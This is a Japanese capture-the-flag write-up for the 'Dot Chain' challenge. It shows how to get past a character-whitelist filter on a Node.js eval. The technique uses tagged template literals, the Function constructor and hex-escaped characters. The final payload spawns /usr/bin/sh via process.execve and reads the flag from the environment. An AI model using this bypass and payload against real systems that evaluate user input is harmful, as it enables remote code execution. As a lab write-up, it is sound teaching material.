# Dot Chain

https://alpacahack.com/daily/challenges/dot-chain

## 問題の概要

入力した内容が Node.js で `eval` される問題です。ただし、入力は次のように検査されます。

```js
if (!/^[.0-9A-z]+$/.test(input)) return;
eval(input);
```

つまり、使用できる文字は

- `.`
- `0-9`
- `A-Z`
- `[`, `\`, `]`, `^`, `_`, `` ` ``
- `a-z`

です。

## 解法

`(`, `)` が使用できないため、関数呼び出しの方法を工夫する必要があります。

[JavaScriptの文法](https://developer.mozilla.org/ja/docs/Web/JavaScript/Guide/Grammar_and_types) を確認すると、タグ付きテンプレートリテラルが目に留まりました。

### タグ付きテンプレートリテラル

```js
tag`str1${val1}str2${val2}str3`;
```

のような構文は、次のように関数 `tag` を呼び出す構文の糖衣構文です。

```js
tag(["str1", "str2", "str3"], val1, val2);
```

これで `(`, `)` を使用せずに関数を呼び出すことができます。

ただし、引数が配列として渡されることに注意する必要があります。例えば `eval` を実行してみると、

```js
eval`console.log("test")`;
// => ['console.log("test")']
```

のように配列が返され、文字列は実行されません。

### Function コンストラクタ

`Function` コンストラクタを使用してコードを実行できるか確認してみます。

````js
Function`console.log("test")```;
// => "test"
````

無事に実行できました。上のコードは次のように展開されます。

```js
Function(['console.log("test")'])();
```

`Function` の引数は文字列として評価されるため、Array.toString() が呼び出され、配列の要素がカンマ区切りの文字列になります。

結果として body が `console.log("test")` の関数が作成され、コードが実行されます。

### エスケープ処理

テンプレートリテラル内では `\xHH` 形式のエスケープシーケンスが使用できるため、使用できない文字を回避できます。

````ts
const code = `console.log("test")`;

// [.0-9A-z] 以外の文字を \xHH 形式でエスケープする
const escaped = code.replace(/[^.0-9A-Za-z]/g, (match) => {
  return `\\x${match.charCodeAt(0).toString(16).padStart(2, "0")}`;
});

console.log("Function`" + escaped + "```");
````

## 解答に使用した入力

エスケープしたコード: `process.execve("/usr/bin/sh")`

送信した入力:

````
Function`process.execve\x28\x22\x2fusr\x2fbin\x2fsh\x22\x29```
env
````

フラグが環境変数にあるのを忘れて、「`require` も `import` もできない！」「`flag.txt` が読めない！」と混乱して `global` からアクセスできる変数を探した結果シェルに `execve` するという方法にたどり着きましたが、普通に `console.log(process.env.FLAG)` でいいと思います。

問題のタイトルの「Dot Chain」の要素が全くなく、許容されている `.` を使用しなくても実行できるので想定解ではない気がしますが(ミスリーディング?)、とりあえずこれでフラグを取得できました。
